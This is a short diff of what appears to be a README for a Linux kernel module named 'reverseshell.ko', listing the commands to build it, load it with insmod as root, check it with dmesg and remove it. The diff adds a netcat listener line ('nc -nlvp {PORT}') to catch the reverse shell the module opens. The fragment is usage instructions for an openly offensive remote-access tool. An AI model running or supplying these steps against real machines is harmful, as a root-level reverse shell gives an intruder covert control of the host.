@@ -6,6 +6,7 @@
 > sudo make
 > sudo chmod +x reverseshell.ko
 > sudo insmod reverseshell.ko
+> nc -nlvp {PORT}
 > dmesg | tail -> check to verify that the module has been loaded and the script has been executed
 > sudo rmmod reverseshell -> delete
 ```
